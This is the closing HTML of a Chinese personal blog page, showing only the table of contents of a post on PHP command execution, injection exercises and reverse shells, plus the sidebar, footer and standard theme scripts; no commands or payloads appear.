class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%BC%95%E5%8F%B7-%E4%B8%AD%E8%BE%93%E5%87%BA%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F"><span class="toc-number">1.2.9.</span> <span class="toc-text">双引号{}中输出可变变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.</span> <span class="toc-text">PHP系统命令执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exec"><span class="toc-number">1.3.1.</span> <span class="toc-text">exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#system"><span class="toc-number">1.3.2.</span> <span class="toc-text">system()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#passthru"><span class="toc-number">1.3.3.</span> <span class="toc-text">passthru()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell-exec"><span class="toc-number">1.3.4.</span> <span class="toc-text">shell_exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#popen"><span class="toc-number">1.3.5.</span> <span class="toc-text">popen()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-com%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.6.</span> <span class="toc-text">windows com对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B8%B8%E7%94%A8%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%EF%BC%88%E5%B9%B6%E8%A1%8C%E6%89%A7%E8%A1%8C%E4%B8%A4%E6%9D%A1%E5%91%BD%E4%BB%A4%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">命令执行常用特殊字符（并行执行两条命令）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.</span> <span class="toc-text">其他PHP危险函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.1.</span> <span class="toc-text">包含函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.2.</span> <span class="toc-text">文件操作函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%83%E4%B9%A0"><span class="toc-number">2.</span> <span class="toc-text">命令执行漏洞利用练习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BE%8B1"><span class="toc-number">2.1.</span> <span class="toc-text">命令执行例1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BE%8B2"><span class="toc-number">2.2.</span> <span class="toc-text">命令执行例2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BE%8B3"><span class="toc-number">2.3.</span> <span class="toc-text">命令执行例3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9Shell%E7%AE%80%E4%BB%8B"><span class="toc-number">3.1.</span> <span class="toc-text">反弹Shell简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%AD%A3%E5%90%91shell"><span class="toc-number">3.1.1.</span> <span class="toc-text">什么是正向shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%90%91shell"><span class="toc-number">3.1.2.</span> <span class="toc-text">什么是反向shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.2.</span> <span class="toc-text">Linux反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.3.</span> <span class="toc-text">Windows反弹shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#refer"><span class="toc-number">4.</span> <span class="toc-text">refer</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/27148/" title="hexo教程-搭建个人博客踩坑"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237534.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hexo教程-搭建个人博客踩坑"/></a><div class="content"><a class="title" href="/posts/27148/" title="hexo教程-搭建个人博客踩坑">hexo教程-搭建个人博客踩坑</a><time datetime="2022-12-01T20:06:04.292Z" title="更新于 2022-12-02 04:06:04">2022-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/40881/" title="hexo教程-搜索引擎收录"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308742.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hexo教程-搜索引擎收录"/></a><div class="content"><a class="title" href="/posts/40881/" title="hexo教程-搜索引擎收录">hexo教程-搜索引擎收录</a><time datetime="2022-12-01T19:46:44.476Z" title="更新于 2022-12-02 03:46:44">2022-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4710/" title="12. 网络编程"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237563.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="12. 网络编程"/></a><div class="content"><a class="title" href="/posts/4710/" title="12. 网络编程">12. 网络编程</a><time datetime="2022-12-01T18:46:52.094Z" title="更新于 2022-12-02 02:46:52">2022-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/5964/" title="11. 异常与文件操作"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237490.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="11. 异常与文件操作"/></a><div class="content"><a class="title" href="/posts/5964/" title="11. 异常与文件操作">11. 异常与文件操作</a><time datetime="2022-12-01T07:21:16.578Z" title="更新于 2022-12-01 15:21:16">2022-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/22609/" title="网站SEO优化"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237551.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网站SEO优化"/></a><div class="content"><a class="title" href="/posts/22609/" title="网站SEO优化">网站SEO优化</a><time datetime="2022-11-30T11:09:16.189Z" title="更新于 2022-11-30 19:09:16">2022-11-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By 晚上十一点睡觉</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to 11pmsleep's blog ~~~ 该网站用来记录学习笔记及生活，欢迎交流技术~~~Blog仅供个人记录笔记学习所用，若有侵权，联系我删除~若有错误，也望诸君不吝指正</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikoo.gungnir.top/',
+      region: '',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo.gungnir.top/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
